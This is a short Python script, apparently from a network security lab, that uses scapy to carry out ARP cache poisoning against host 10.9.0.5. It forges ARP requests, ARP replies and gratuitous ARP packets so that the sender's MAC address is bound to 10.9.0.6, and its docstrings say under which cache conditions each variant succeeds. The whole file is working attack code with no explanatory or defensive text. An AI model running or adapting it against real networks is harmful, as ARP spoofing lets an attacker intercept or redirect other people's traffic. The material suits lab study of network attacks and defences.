#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp, ls, srp


def arp_request_poison():
    """
    works no matter B is in target's cache or not
    """
    E = Ether(dst="ff:ff:ff:ff:ff:ff")
    A = ARP(op=1, psrc="10.9.0.6", pdst="10.9.0.5")
    pkt = E / A
    pkt.show()
    sendp(pkt)


def get_arp_mac():
    E = Ether(dst="ff:ff:ff:ff:ff:ff")
    A = ARP(op=1, pdst="10.9.0.5")
    pkt = E / A
    pkt.show()
    ans, unans = srp(pkt)
    return ans[0][1].hwsrc


def arp_reply_poison():
    """
    only works when B's mac is already in target's cache
    """
    target_mac = get_arp_mac()
    # target_mac = "02:42:0a:09:00:05"
    print("in arp_reply_poison {}".format(target_mac))
    print("int arp_reply")
    E = Ether(dst=target_mac)
    A = ARP(op=2, pdst="10.9.0.5", hwdst=target_mac,
            psrc="10.9.0.6", hwsrc=E.src)
    pkt = E / A
    pkt.show()
    sendp(pkt)


def arp_gratuitous_req():
    '''
    reply arp only works when the poison addr already in target
    '''
    E = Ether(dst="ff:ff:ff:ff:ff:ff")
    A = ARP(op=2, psrc="10.9.0.6", pdst="10.9.0.6", hwdst="ff:ff:ff:ff:ff:ff")
    pkt = E / A
    pkt.show()
    sendp(pkt)


if __name__ == "__main__":
    arp_request_poison()
    # arp_reply_poison()
    # arp_gratuitous_req()
